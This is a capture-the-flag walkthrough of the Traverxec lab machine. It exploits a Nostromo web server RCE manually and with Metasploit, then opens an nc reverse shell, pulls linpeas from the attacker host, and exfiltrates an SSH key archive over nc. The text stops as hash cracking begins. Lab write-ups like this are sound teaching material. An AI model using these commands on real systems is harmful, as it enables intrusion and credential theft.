# Overview

Traverxec is an easy linux box that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user's home directory reveals that the user can execute `journalctl` as root, which is exploited to spawn a `root` shell!

---

# Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.165 | grep ^[0-9] | cut -d '/' -f
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.165
```

![Initial NMAP](/images/traverxec/nmap.png)

Once the scan completes, it reveals ports 22 and 80 are open. NMAP also reports that the `http-server-header` is `nostromo 1.9.6`, which indicates the box is running the `Nostromo` HTTP server.

# Nostromo

![Nostromo](/images/traverxec/nostromo.png)

The webpage appears to be pretty empty, resulting in very little information at first look. So, we fire off a gobuster:

```bash
gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n
```

While we let gobuster run in the background, I look to Google. After a bit of digging, we find that Nostromo version 1.9.6 has a <a href="https://www.exploit-db.com/exploits/47837">Remote Code Execution</a> vulnerability. Being that this exploit is found on Exploit-DB, that usually means there is a Metasploit module for it - which means we can "manually" exploit it or use Metasploit. I'll show both ways.

---
# "Manual" exploitation

First, we need to copy the exploit from exploit-db and inspect it:

```bash
searchsploit -m /multiple/remote/47837
```


![Exploit](/images/traverxec/payload.png)

**The heck is going on?**

Interesting. We're exploiting the `http_verify` function in nostromo nhttpd. Which is allowing us remote code execution. Let's test it out:

```bash
python 47837.py 10.10.10.165 80 id
```
![Response](/images/traverxec/id.png)

Ok, cool, we got a response. Lets setup a listener and try to get a shell:

```bash
nc -lvnp 9001
```

```bash
python 47837.py "nc -e bash 10.10.10.165 9001"
```

And........ We get a shell

---
# Metasploit

Now that we've manually exploited Nostromo, let's automate it with `Metasploit`.

```bash
msfconsole
msf > use exploit/multi/htto/nostromo_code_exec
msf > set rhost 10.10.10.165
msf > set lhost 10.10.14.40
msf > run
```
> *Make sure you set lhost to YOUR machines IP.*

![Metasploit](/images/traverxec/metasploit.png)

After we fire off the exploit, we get a shell:

![Metasploit-Shell](/images/traverxec/meta-shell.png)

---
# Stabelize Shell
Let's move forward with our manual shell. But first, we need to stabelize it. I don't know about you, but I can't live without TAB auto-cmplete!

The target machine is Linux, so it *SHOULD* have `Python` installed, but lets check anyway.
```bash
which python
/usr/bin/python
```
*Let's spawn a TTY shell!* 
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z (to background)
stty raw -echo
fg [enter] (to send to foreground)
```
We should now have a stable shell!

# Automated Target Enumeration

I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.

*On Attacker Machine, in the Linpeas directory*
```bash
python -m SimpleHTTPServer
```

*On Target Machine*
```bash
cd /tmp/
wget 10.10.14.10:8000/linpeas.sh
```
![Linpeas](/images/traverxec/linpeas-wget.png)

Now that we have Linpeas, we use `chmod +x` to make it an executable and then `.\linpeas.sh` to run it.

# Manual Target Enumeration

We have linpeas running, so now we can start manually enumerating the box. We check `/etc/passwd` and find the user `David` exists. It also shows us the web root for nostromo is `/var/nostromo/`. The `/var/nostromo/conf` directory, which contains the `.htpasswd` which leaks a crackable hash. We also find the file `nhttpd.conf` which reveals some interesting information. The file has a section called `HOMEDIRS` and hints towards `public_www` folders in a user's home directory.

```bash
ls -la /home/david/public_www/
ls -la /home/david/public_www/
```

![Protected-Area](/images/traverxec/enum-protected.png)

**BINGO!** We find `backup-ssh-identity-files.tgz`. Let's exfiltrate it!

*On Attacker Machine*
```bash
nc -lvp 1234 > backup-ssh-identity-files.tgz
```

*On Target Machine*
```bash
nc 10.10.14.40 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```
Let's extract the files. 

```bash
tar -xvf backup-ssh-identity-files.tgz
```
The archive contains SSH keys, one of them being the private key `id_rsa`.

*Before we continue, lets check in on Linpeas*

![Linpeas-Hash](/images/traverxec/linpeas-hash.png)

Looks like it found the same hash we did. Time to crack it!

### Hashcat

> As a disclaimer, this is a small rabbit-hole, but not entirely useless. If you didn't find the hidden directory in David's home directory, this was another way to get the same end result.
